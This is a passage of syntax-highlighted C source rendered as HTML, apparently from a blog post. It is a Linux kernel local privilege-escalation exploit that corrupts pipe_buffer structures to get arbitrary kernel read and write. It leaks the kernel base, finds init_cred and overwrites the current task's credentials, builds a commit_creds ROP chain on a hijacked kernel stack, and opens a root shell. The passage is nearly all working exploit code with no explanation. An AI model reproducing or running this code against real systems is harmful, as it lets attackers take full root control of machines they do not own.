class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (snd_vicitm_pid == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to corrupt second-level pipe_buffer!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">size_t</span> trd_pipe_sz = <span class="number">0x1000</span> * (TRD_PIPE_BUF_SZ / <span class="keyword">sizeof</span>(struct pipe_buffer));</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> <span class="title">evil_pipe_buf</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page_ptr</span>;</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">        write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="number">24</span> - <span class="number">3</span> * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] free second-level original pipe...&quot;</span>);</span><br><span class="line">        close(pipe_fd[snd_orig_pid][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[snd_orig_pid][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] fcntl() to set the pipe_buffer on second-level victim page...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, trd_pipe_sz) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);</span><br><span class="line">                errExit(<span class="string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking the 2nd pipe_buffer on page to itself...&quot;</span>);</span><br><span class="line">        evil_pipe_buf.page = info_pipe_buf.page;</span><br><span class="line">        evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">        evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line">        evil_pipe_buf.ops = info_pipe_buf.ops;</span><br><span class="line">        evil_pipe_buf.flags = info_pipe_buf.flags;</span><br><span class="line">        evil_pipe_buf.<span class="keyword">private</span> = info_pipe_buf.<span class="keyword">private</span>;</span><br><span class="line"></span><br><span class="line">        write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            read(pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">            <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page)</span><br><span class="line">            &#123;</span><br><span class="line">                self_2nd_pipe_pid = i;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found self-writing pipe: \033[0m%d\n&quot;</span>,</span><br><span class="line">                       self_2nd_pipe_pid);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (self_2nd_pipe_pid == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to build a self-writing pipe!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking the 3rd pipe_buffer on page to itself...&quot;</span>);</span><br><span class="line">        evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">        evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line"></span><br><span class="line">        write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line">        write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid || i == self_2nd_pipe_pid)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            read(pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">            <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page)</span><br><span class="line">            &#123;</span><br><span class="line">                self_3rd_pipe_pid = i;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span></span><br><span class="line">                       <span class="string">&quot;%d\n&quot;</span>,</span><br><span class="line">                       self_3rd_pipe_pid);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (self_3rd_pipe_pid == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to build a self-writing pipe!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking the 4th pipe_buffer on page to itself...&quot;</span>);</span><br><span class="line">        evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">        evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line"></span><br><span class="line">        write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line">        write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid || i == self_2nd_pipe_pid || i == self_3rd_pipe_pid)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            read(pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">            <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page)</span><br><span class="line">            &#123;</span><br><span class="line">                self_4th_pipe_pid = i;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span></span><br><span class="line">                       <span class="string">&quot;%d\n&quot;</span>,</span><br><span class="line">                       self_4th_pipe_pid);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (self_4th_pipe_pid == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to build a self-writing pipe!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Setting up kernel arbitrary read &amp; write...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;evil_2nd_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;evil_3rd_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;evil_4th_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">        evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">        evil_2nd_buf.len = <span class="number">0xff0</span>;</span><br><span class="line"></span><br><span class="line">        evil_3rd_buf.offset = TRD_PIPE_BUF_SZ * <span class="number">3</span>;</span><br><span class="line">        evil_3rd_buf.len = <span class="number">0</span>;</span><br><span class="line">        write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">        evil_4th_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">        evil_4th_buf.len = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        vmemmap_base = (<span class="keyword">size_t</span>)info_pipe_buf.page &amp; <span class="number">0xfffffffff0000000</span>;</span><br><span class="line">        <span class="keyword">for</span> (;;)</span><br><span class="line">        &#123;</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)(vmemmap_base + <span class="number">157</span> * <span class="number">0x40</span>), buf);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (*(<span class="keyword">uint64_t</span> *)buf &gt; <span class="number">0xffffffff81000000</span> &amp;&amp; ((*(<span class="keyword">uint64_t</span> *)buf &amp; <span class="number">0xfff</span>) == <span class="number">0x070</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                kernel_base = *(<span class="keyword">uint64_t</span> *)buf - <span class="number">0x070</span>;</span><br><span class="line">                kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m0x%lx\n&quot;</span></span><br><span class="line">                       <span class="string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m0x%lx\n&quot;</span>,</span><br><span class="line">                       kernel_base, kernel_offset);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            vmemmap_base -= <span class="number">0x10000000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] vmemmap_base:\033[0m 0x%lx\n\n&quot;</span>, vmemmap_base);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> parent_task, current_task;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Seeking task_struct in memory...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">uint64_t</span> *comm_addr = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">uint64_t</span> *point_buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; <span class="number">1</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)(vmemmap_base + i * <span class="number">0x40</span>), point_buf);</span><br><span class="line"></span><br><span class="line">            comm_addr = memmem(point_buf, <span class="number">0xf00</span>, target, <span class="number">0xf</span>);</span><br><span class="line">            <span class="keyword">if</span> (comm_addr &amp;&amp; (comm_addr[<span class="number">-2</span>] &gt; <span class="number">0xffff888000000000</span>) &amp;&amp; (comm_addr[<span class="number">-3</span>] &gt; <span class="number">0xffff888000000000</span>) &amp;&amp; (comm_addr[<span class="number">-57</span>] &gt; <span class="number">0xffff888000000000</span>) &amp;&amp; (comm_addr[<span class="number">-56</span>] &gt; <span class="number">0xffff888000000000</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                parent_task = comm_addr[<span class="number">-57</span>];</span><br><span class="line"></span><br><span class="line">                current_task = comm_addr[<span class="number">-50</span>] - <span class="number">2528</span>;</span><br><span class="line"></span><br><span class="line">                page_offset_base = (comm_addr[<span class="number">-50</span>] &amp; <span class="number">0xfffffffffffff000</span>) - i * <span class="number">0x1000</span>;</span><br><span class="line">                page_offset_base &amp;= <span class="number">0xfffffffff0000000</span>;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found task_struct on page: \033[0m%p\n&quot;</span>,</span><br><span class="line">                       (struct page *)(vmemmap_base + i * <span class="number">0x40</span>));</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] page_offset_base: \033[0m0x%lx\n&quot;</span>,</span><br><span class="line">                       page_offset_base);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] current task_struct&#x27;s addr: \033[0m&quot;</span></span><br><span class="line">                       <span class="string">&quot;0x%lx\n\n&quot;</span>,</span><br><span class="line">                       current_task);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> command = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> stack_addr;</span><br><span class="line">    <span class="keyword">size_t</span> *tsk_buf;</span><br><span class="line">    <span class="keyword">size_t</span> *mm_struct_buf;</span><br><span class="line">    <span class="keyword">uint64_t</span> mm_struct_addr;</span><br><span class="line">    <span class="keyword">uint64_t</span> mm_struct_page;</span><br><span class="line">    <span class="keyword">uint64_t</span> pgd_addr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (command)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Seeking for init_task...&quot;</span>);</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">uint64_t</span> init_task;</span><br><span class="line">            <span class="keyword">uint64_t</span> init_cred;</span><br><span class="line">            <span class="keyword">uint64_t</span> init_nsproxy;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (;;)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">size_t</span> ptask_page_addr = direct_map_addr_to_page_addr(parent_task);</span><br><span class="line"></span><br><span class="line">                tsk_buf = (<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span>)buf + (parent_task &amp; <span class="number">0xfff</span>));</span><br><span class="line"></span><br><span class="line">                arbitrary_read_by_pipe((struct page *)ptask_page_addr, buf);</span><br><span class="line">                arbitrary_read_by_pipe((struct page *)(ptask_page_addr + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span> * <span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* task_struct::real_parent */</span></span><br><span class="line">                <span class="keyword">if</span> (parent_task == tsk_buf[<span class="number">309</span>])</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                parent_task = tsk_buf[<span class="number">309</span>];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            init_task = parent_task;</span><br><span class="line">            init_cred = tsk_buf[<span class="number">363</span>];</span><br><span class="line">            init_nsproxy = tsk_buf[<span class="number">377</span>];</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n&quot;</span>, init_task);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>, init_nsproxy);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* now, changing the current task_struct to get the full root :) */</span></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">size_t</span> current_task_page = direct_map_addr_to_page_addr(current_task);</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((struct page *)current_task_page, buf);</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)(current_task_page + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span> * <span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line">            tsk_buf = (<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span>)buf + (current_task &amp; <span class="number">0xfff</span>));</span><br><span class="line">            tsk_buf[<span class="number">363</span>] = init_cred;</span><br><span class="line">            tsk_buf[<span class="number">364</span>] = init_cred;</span><br><span class="line">            tsk_buf[<span class="number">377</span>] = init_nsproxy;</span><br><span class="line"></span><br><span class="line">            arbitrary_write_by_pipe((struct page *)current_task_page, buf, <span class="number">0xff0</span>);</span><br><span class="line">            arbitrary_write_by_pipe((struct page *)(current_task_page + <span class="number">0x40</span>),</span><br><span class="line">                                    &amp;buf[<span class="number">512</span> * <span class="number">8</span>], <span class="number">0xff0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[+] Done.\n&quot;</span>);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] checking for root...&quot;</span>);</span><br><span class="line"></span><br><span class="line">            get_shell();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Reading current task_struct...&quot;</span>);</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">size_t</span> current_task_page = direct_map_addr_to_page_addr(current_task);</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)current_task_page, buf);</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)(current_task_page + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span> * <span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line">            tsk_buf = (<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span>)buf + (current_task &amp; <span class="number">0xfff</span>));</span><br><span class="line">            stack_addr = tsk_buf[<span class="number">4</span>];</span><br><span class="line">            mm_struct_addr = tsk_buf[<span class="number">292</span>];</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] kernel stack&#x27;s addr:\033[0m0x%lx\n&quot;</span>, stack_addr);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s addr:\033[0m0x%lx\n&quot;</span>, mm_struct_addr);</span><br><span class="line"></span><br><span class="line">            mm_struct_page = direct_map_addr_to_page_addr(mm_struct_addr);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s page:\033[0m0x%lx\n&quot;</span>, mm_struct_page);</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((struct page *)mm_struct_page, buf);</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)(mm_struct_page + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span> * <span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line">            mm_struct_buf = (<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span>)buf + (mm_struct_addr &amp; <span class="number">0xfff</span>));</span><br><span class="line"></span><br><span class="line">            pgd_addr = mm_struct_buf[<span class="number">9</span>];</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got kernel page table of current task:\033[0m&quot;</span></span><br><span class="line">                   <span class="string">&quot;0x%lx\n\n&quot;</span>,</span><br><span class="line">                   pgd_addr);</span><br><span class="line">        &#125;</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] Reading page table...&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">size_t</span> rop[<span class="number">0x1000</span>];</span><br><span class="line">            <span class="keyword">size_t</span> idx = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">uint64_t</span> stack_addr_another;</span><br><span class="line">            <span class="keyword">size_t</span> pud_addr, pmd_addr, pte_addr, pte_val;</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pgd_addr), buf);</span><br><span class="line">            pud_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PGD_ENTRY(stack_addr)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">            pud_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pud_addr), buf);</span><br><span class="line">            pmd_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PUD_ENTRY(stack_addr)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">            pmd_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pmd_addr), buf);</span><br><span class="line">            pte_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PMD_ENTRY(stack_addr)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">            pte_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pte_addr), buf);</span><br><span class="line">            pte_val = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PTE_ENTRY(stack_addr)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line"></span><br><span class="line">            stack_addr_another = pte_val;</span><br><span class="line">            stack_addr_another &amp;= (~PAGE_ATTR_NX);</span><br><span class="line">            stack_addr_another += page_offset_base;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got another virt addr of kernel stack: \033[0m&quot;</span></span><br><span class="line">                   <span class="string">&quot;0x%lx\n\n&quot;</span>,</span><br><span class="line">                   stack_addr_another);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ((<span class="number">0x1000</span> - <span class="number">0x100</span>) / <span class="number">8</span>); i++)</span><br><span class="line">            &#123;</span><br><span class="line">                rop[idx++] = RET + kernel_offset;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            rop[idx++] = POP_RDI_RET + kernel_offset;</span><br><span class="line">            rop[idx++] = INIT_CRED + kernel_offset;</span><br><span class="line">            rop[idx++] = COMMIT_CREDS + kernel_offset;</span><br><span class="line">            rop[idx++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">54</span> + kernel_offset;</span><br><span class="line">            rop[idx++] = *(<span class="keyword">size_t</span> *)<span class="string">&quot;0x196082&quot;</span>;</span><br><span class="line">            rop[idx++] = *(<span class="keyword">size_t</span> *)<span class="string">&quot;0x196082&quot;</span>;</span><br><span class="line">            rop[idx++] = (<span class="keyword">size_t</span>)get_shell;</span><br><span class="line">            rop[idx++] = user_cs;</span><br><span class="line">            rop[idx++] = user_rflags;</span><br><span class="line">            rop[idx++] = user_sp;</span><br><span class="line">            rop[idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">uint64_t</span> stack_page = direct_map_addr_to_page_addr(stack_addr_another);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] Hijacking current task&#x27;s stack...&quot;</span>);</span><br><span class="line"></span><br><span class="line">            sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">            arbitrary_write_by_pipe((struct page *)(stack_page + <span class="number">0x40</span> * <span class="number">3</span>), rop, <span class="number">0xff0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Reading current task_struct...&quot;</span>);</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">size_t</span> current_task_page = direct_map_addr_to_page_addr(current_task);</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)current_task_page, buf);</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)(current_task_page + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span> * <span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line">            tsk_buf = (<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span>)buf + (current_task &amp; <span class="number">0xfff</span>));</span><br><span class="line">            stack_addr = tsk_buf[<span class="number">4</span>];</span><br><span class="line">            mm_struct_addr = tsk_buf[<span class="number">292</span>];</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] kernel stack&#x27;s addr:\033[0m0x%lx\n&quot;</span>, stack_addr);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s addr:\033[0m0x%lx\n&quot;</span>, mm_struct_addr);</span><br><span class="line"></span><br><span class="line">            mm_struct_page = direct_map_addr_to_page_addr(mm_struct_addr);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s page:\033[0m0x%lx\n&quot;</span>, mm_struct_page);</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((struct page *)mm_struct_page, buf);</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)(mm_struct_page + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span> * <span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line">            mm_struct_buf = (<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span>)buf + (mm_struct_addr &amp; <span class="number">0xfff</span>));</span><br><span class="line"></span><br><span class="line">            pgd_addr = mm_struct_buf[<span class="number">9</span>];</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got kernel page table of current task:\033[0m&quot;</span></span><br><span class="line">                   <span class="string">&quot;0x%lx\n\n&quot;</span>,</span><br><span class="line">                   pgd_addr);</span><br><span class="line">        &#125;</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> *kcode_map;</span><br><span class="line">            <span class="keyword">size_t</span> dst_paddr, dst_vaddr;</span><br><span class="line"></span><br><span class="line">            kcode_map = mmap((<span class="keyword">void</span> *)<span class="number">0x114514000</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE,</span><br><span class="line">                             MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (!kcode_map)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;FAILED to create mmap area!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                kcode_map[i] = <span class="string">&quot;0x196082&quot;</span>[i];</span><br><span class="line">                kcode_map[i + <span class="number">0x1000</span>] = <span class="string">&quot;0x196082&quot;</span>[i];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            dst_vaddr = NS_CAPABLE_SETID + kernel_offset;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] vaddr of ns_capable_setid is: \033[0m0x%lx\n&quot;</span>, dst_vaddr);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">size_t</span> pud_addr, pmd_addr;</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pgd_addr), buf);</span><br><span 